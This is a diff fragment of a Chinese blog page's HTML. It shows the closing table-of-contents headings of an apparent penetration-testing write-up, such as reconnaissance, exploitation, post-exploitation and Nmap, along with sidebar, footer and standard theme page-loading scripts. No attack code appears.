+          2.1：情报收集 &amp; 威胁建模</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB"><span class="toc-text">
+          2.2：漏洞分析 &amp; 渗透攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3%EF%BC%9A%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-text">
+          2.3：后渗透</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3%EF%BC%9A%E6%80%BB%E7%BB%93"><span class="toc-text">
+          3：总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1%EF%BC%9A%E5%91%BD%E4%BB%A4-%E5%B7%A5%E5%85%B7"><span class="toc-text">
+          3.1：命令 &amp; 工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-1%EF%BC%9ANmap"><span class="toc-text">
+          3.1.1：Nmap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF"><span class="toc-text">
+          3.2：关键技术</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/notAlone.png" alt="avatar"></div><p class="sidebar-ov-author__text">但愿五湖明月在。</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">46</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">20</div><div class="sidebar-ov-state-item__name">分类</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022~2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>镜坛主</span></div><div>欢迎来到 —— 镜坛！</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js"></script><script>window.addEventListener('DOMContentLoaded', function () {
+  var pjax = new Pjax({"selectors":["head title","#main",".pjax-reload",".header-banner"],"history":true,"scrollTo":false,"scrollRestoration":false,"cacheBust":false,"debug":false,"currentUrlFullReload":false,"timeout":0});
+  // 加载进度条的计时器
+  var loadingTimer = null;
+
+  // 重置页面 Y 方向上的滚动偏移量
+  document.addEventListener('pjax:send', function () {
+    $('.header-nav-menu').removeClass('show');
+    if (CONFIG.pjax && CONFIG.pjax.avoidBanner) {
+      $('html').velocity('scroll', {
+        duration: 500,
+        offset: $('#header').height(),
+        easing: 'easeInOutCubic'
+      });
+    }
+
+    var loadingBarWidth = 20;
+    var MAX_LOADING_WIDTH = 95;
+
+    $('.loading-bar').addClass('loading');
+    $('.loading-bar__progress').css('width', loadingBarWidth + '%');
+    clearInterval(loadingTimer);
+    loadingTimer = setInterval(function () {
+      loadingBarWidth += 3;
+      if (loadingBarWidth > MAX_LOADING_WIDTH) {
+        loadingBarWidth = MAX_LOADING_WIDTH;
+      }
+      $('.loading-bar__progress').css('width', loadingBarWidth + '%');
+    }, 500);
+  }, false);
+
+  window.addEventListener('pjax:complete', function () {
+    clearInterval(loadingTimer);
+    $('.loading-bar__progress').css('width', '100%');
+    $('.loading-bar').removeClass('loading');
+    setTimeout(function () {
+      $('.loading-bar__progress').css('width', '0');
+    }, 400);
+    $('link[rel=prefetch], script[data-pjax-rm]').each(function () {
+      $(this).remove();
+    });
+    $('script[data-pjax], #pjax-reload script').each(function () {
+      $(this).parent().append($(this).remove());
+    });
+
+    if (Stun.utils.pjaxReloadBoot) {
+      Stun.utils.pjaxReloadBoot();
+    }
+    if (Stun.utils.pjaxReloadScroll) {
+      Stun.utils.pjaxReloadScroll();
+    }
+    if (Stun.utils.pjaxReloadSidebar) {
+      Stun.utils.pjaxReloadSidebar();
+    }
+    if (false) {
+      if (Stun.utils.pjaxReloadHeader) {
+        Stun.utils.pjaxReloadHeader();
+      }
+      if (Stun.utils.pjaxReloadScrollIcon) {
+        Stun.utils.pjaxReloadScrollIcon();
+      }
+      if (Stun.utils.pjaxReloadLocalSearch) {
+        Stun.utils.pjaxReloadLocalSearch();
+      }
+    }
+  }, false);
+}, false);</script><div id="pjax-reload"></div><script src="/js/utils.js?v=2.8.0"></script><script src="/js/stun-boot.js?v=2.8.0"></script><script src="/js/scroll.js?v=2.8.0"></script><script src="/js/header.js?v=2.8.0"></script><script src="/js/web-effect-click.js?v=2.8.0"></script><script src="/js/web-effect-flower.js?v=2.8.0"></script><script src="/js/sidebar.js?v=2.8.0"></script></body></html>
